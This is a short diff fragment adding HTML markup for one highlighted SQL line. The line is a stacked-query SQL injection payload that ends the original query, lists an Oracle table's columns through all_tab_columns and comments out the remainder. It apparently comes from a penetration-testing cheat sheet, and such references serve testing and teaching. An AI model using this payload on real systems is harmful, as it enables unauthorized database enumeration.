+<div class="language-sql highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="p">;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">all_tab_columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;table_name&#39;</span><span class="p">;</span><span class="w"> </span><span class="c1">--</span>
+</span></code></pre></div></p>
 
 
 
